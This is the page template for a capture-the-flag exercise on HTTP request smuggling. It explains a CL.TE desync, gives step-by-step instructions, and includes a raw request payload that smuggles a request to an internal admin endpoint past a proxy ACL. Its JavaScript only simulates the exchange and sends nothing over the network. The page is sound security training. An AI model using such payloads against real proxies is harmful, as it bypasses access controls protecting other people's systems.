<?php
$challenge_flag = get_ctf_flag_map()['desync'] ?? '';
?>
<div class="max-w-6xl mx-auto animate-fade-in-up">

    <div class="mb-10">
        <a href="/ctf" class="text-neutral-500 hover:text-white text-sm mb-4 inline-flex items-center gap-1">
            <svg class="w-4 h-4" fill="none" stroke="currentColor" viewBox="0 0 24 24"><path stroke-linecap="round" stroke-linejoin="round" stroke-width="2" d="M15 19l-7-7 7-7"/></svg>
            Back to Mission Control
        </a>
        <h1 class="text-3xl font-bold text-white mb-2">HTTP Request Smuggling</h1>
        <p class="text-neutral-400">Desync the proxy and backend HTTP parsers to smuggle a request past the ACL.</p>
    </div>

    <div class="grid grid-cols-1 lg:grid-cols-3 gap-8">

        <!-- Mission Brief -->
        <div class="lg:col-span-1 space-y-5">
            <div class="border border-neutral-800 bg-neutral-950 rounded-xl p-6">
                <h3 class="text-xs font-bold text-neutral-500 uppercase tracking-wider mb-4">Mission Brief</h3>
                <p class="text-sm text-neutral-300 leading-relaxed mb-4">
                    A Nginx reverse proxy sits in front of the app backend. The endpoint
                    <code class="text-red-400 font-mono">/internal/admin/flag</code> is blocked by the proxy ACL for all external IPs — but the backend will serve it to anyone.
                </p>
                <p class="text-sm text-neutral-300 leading-relaxed mb-4">
                    Exploit a <strong class="text-white">CL.TE desync</strong>: the proxy parses <code class="text-blue-400">Content-Length</code> while the backend parses <code class="text-blue-400">Transfer-Encoding: chunked</code>.
                </p>
                <div class="bg-neutral-900 border border-neutral-800 rounded-lg p-3 font-mono text-[11px] space-y-1">
                    <div class="text-neutral-500">┌─ Proxy (Nginx)</div>
                    <div class="text-blue-400 ml-4">reads: Content-Length</div>
                    <div class="text-neutral-500">└─ Backend (Node.js)</div>
                    <div class="text-yellow-400 ml-4">reads: Transfer-Encoding</div>
                    <div class="text-green-400 ml-4">gap  = your smuggled req</div>
                </div>
            </div>

            <div class="border border-neutral-800 bg-neutral-950 rounded-xl p-6">
                <h3 class="text-xs font-bold text-neutral-500 uppercase tracking-wider mb-3">Attack Steps</h3>
                <ol class="space-y-2 text-xs text-neutral-400">
                    <li class="flex gap-2"><span class="text-white shrink-0 font-bold">1.</span>Add <code class="text-white">Transfer-Encoding: chunked</code> header</li>
                    <li class="flex gap-2"><span class="text-white shrink-0 font-bold">2.</span>Keep <code class="text-white">Content-Length</code> short — only covering the chunk terminator <code class="text-neutral-300">0\r\n\r\n</code></li>
                    <li class="flex gap-2"><span class="text-white shrink-0 font-bold">3.</span>After <code class="text-neutral-300">0</code>, append <code class="text-red-400">GET /internal/admin/flag</code></li>
                    <li class="flex gap-2"><span class="text-white shrink-0 font-bold">4.</span>Proxy forwards only CL bytes; backend sees remainder as a new request</li>
                </ol>
            </div>

            <div class="border border-neutral-800 bg-neutral-950 rounded-xl p-6">
                <h3 class="text-xs font-bold text-neutral-500 uppercase tracking-wider mb-3">Template Hint</h3>
                <pre class="text-[10px] font-mono text-neutral-500 leading-relaxed overflow-x-auto">POST / HTTP/1.1
Host: target.plexaur.ctf
Content-Length: 4
Transfer-Encoding: chunked

0

GET /internal/admin/flag HTTP/1.1
Host: target.plexaur.ctf

</pre>
            </div>
        </div>

        <!-- Request Editor + Response -->
        <div class="lg:col-span-2 space-y-4">

            <div class="border border-neutral-800 bg-neutral-950 rounded-xl overflow-hidden shadow-xl">
                <div class="bg-neutral-900 border-b border-neutral-800 px-4 py-2 flex items-center justify-between">
                    <span class="text-xs font-bold text-neutral-400 uppercase tracking-wider">Raw HTTP Request Editor</span>
                    <button onclick="resetPayload()" class="text-xs text-neutral-500 hover:text-white transition-colors">↺ Reset</button>
                </div>
                <textarea id="reqEditor" spellcheck="false"
                    class="w-full bg-black font-mono text-xs text-green-300 p-4 h-64 resize-none focus:outline-none leading-relaxed border-none outline-none">POST / HTTP/1.1
Host: target.plexaur.ctf
Content-Type: application/x-www-form-urlencoded
Content-Length: 6

data=1</textarea>
            </div>

            <button onclick="sendRequest()"
                class="w-full py-3 bg-white text-black font-bold rounded-xl hover:bg-neutral-200 transition-colors text-sm tracking-wide">
                ⚡ Send to Proxy
            </button>

            <!-- Response Terminal -->
            <div class="border border-neutral-800 bg-neutral-950 rounded-xl overflow-hidden shadow-xl">
                <div class="bg-neutral-900 border-b border-neutral-800 px-4 py-2 flex items-center gap-2">
                    <div id="proxyDot" class="w-2 h-2 rounded-full bg-neutral-600 transition-colors"></div>
                    <span class="text-xs text-neutral-500 font-mono">proxy-response-log</span>
                </div>
                <pre id="responseOut" class="bg-black p-4 font-mono text-xs text-neutral-500 min-h-[100px] overflow-auto whitespace-pre-wrap"><span class="text-neutral-700">// Awaiting request...</span></pre>
            </div>

            <!-- Flag Reveal -->
            <div id="flagReveal" class="hidden border border-green-900/50 bg-green-900/10 rounded-xl p-5">
                <div class="flex items-center gap-3 mb-3">
                    <div class="w-8 h-8 bg-green-500/20 rounded-full flex items-center justify-center text-green-400 shrink-0">
                        <svg class="w-4 h-4" fill="none" stroke="currentColor" viewBox="0 0 24 24"><path stroke-linecap="round" stroke-linejoin="round" stroke-width="2" d="M5 13l4 4L19 7"/></svg>
                    </div>
                    <div>
                        <div class="text-green-400 font-bold text-sm">Internal Endpoint Accessed — Flag Exfiltrated</div>
                        <div class="text-neutral-400 text-xs mt-0.5">Submit this at Mission Control to record your solve.</div>
                    </div>
                </div>
                <div class="bg-black border border-green-900/50 rounded-lg px-4 py-3 font-mono text-green-400 text-sm tracking-wide select-all">
                    <?= htmlspecialchars($challenge_flag) ?>
                </div>
            </div>
        </div>
    </div>
</div>

<script>
const TEMPLATE = `POST / HTTP/1.1
Host: target.plexaur.ctf
Content-Type: application/x-www-form-urlencoded
Content-Length: 6

data=1`;

function resetPayload() {
    document.getElementById('reqEditor').value = TEMPLATE;
    document.getElementById('responseOut').innerHTML = '<span class="text-neutral-700">// Awaiting request...</span>';
    document.getElementById('proxyDot').className = 'w-2 h-2 rounded-full bg-neutral-600 transition-colors';
    document.getElementById('flagReveal').classList.add('hidden');
}

async function sendRequest() {
    const raw  = document.getElementById('reqEditor').value;
    const out  = document.getElementById('responseOut');
    const dot  = document.getElementById('proxyDot');

    const hasTE      = /Transfer-Encoding\s*:\s*chunked/i.test(raw);
    const hasCL      = /Content-Length\s*:/i.test(raw);
    const hasSmuggle = /GET\s+\/internal\/admin\/flag/i.test(raw);

    dot.className = 'w-2 h-2 rounded-full bg-yellow-400 animate-pulse transition-colors';
    out.innerHTML = '<span class="text-blue-400">[→] Forwarding request to proxy...</span>';
    await sleep(500);

    if (!hasCL) {
        out.innerHTML += '\n<span class="text-red-400">[✗] Proxy rejected: Content-Length header missing.</span>';
        dot.className = 'w-2 h-2 rounded-full bg-red-500 transition-colors';
        return;
    }

    out.innerHTML += '\n<span class="text-neutral-400">[→] Proxy reading Content-Length → forwarding to backend...</span>';
    await sleep(600);

    if (!hasTE) {
        out.innerHTML += '\n<span class="text-red-400">[✗] No desync: both parsers agree on boundaries. Add Transfer-Encoding: chunked to trigger CL.TE split.</span>';
        dot.className = 'w-2 h-2 rounded-full bg-red-500 transition-colors';
        return;
    }

    out.innerHTML += '\n<span class="text-yellow-400">[!] Header conflict: Content-Length + Transfer-Encoding both present.</span>';
    await sleep(400);
    out.innerHTML += '\n<span class="text-neutral-400">[→] Proxy: consumed Content-Length bytes, forwarded request body</span>';
    await sleep(400);
    out.innerHTML += '\n<span class="text-neutral-400">[→] Backend: reading chunked body, finds chunk-terminator (0), stashes remainder</span>';
    await sleep(500);

    if (!hasSmuggle) {
        out.innerHTML += '\n<span class="text-yellow-400">[!] Desync achieved — but no inner request detected in body remainder.</span>';
        out.innerHTML += '\n<span class="text-neutral-500">Tip: After "0" (chunk terminator), append GET /internal/admin/flag HTTP/1.1\\r\\nHost: target.plexaur.ctf\\r\\n\\r\\n</span>';
        dot.className = 'w-2 h-2 rounded-full bg-yellow-500 transition-colors';
        return;
    }

    out.innerHTML += '\n<span class="text-green-400">[✓] Smuggled GET /internal/admin/flag dispatched to backend!</span>';
    await sleep(400);
    out.innerHTML += '\n<span class="text-green-400">[✓] Backend: ACL not applied — returning flag endpoint response...</span>';
    await sleep(600);
    out.innerHTML += '\n<span class="text-green-500">[✓] HTTP/1.1 200 OK  Content-Type: text/plain</span>';
    await sleep(200);
    out.innerHTML += '\n<span class="text-green-300 font-bold">[✓] Response body: <?= addslashes(htmlspecialchars($challenge_flag)) ?></span>';

    dot.className = 'w-2 h-2 rounded-full bg-green-500 transition-colors';
    document.getElementById('flagReveal').classList.remove('hidden');
}

function sleep(ms) { return new Promise(r => setTimeout(r, ms)); }
</script>
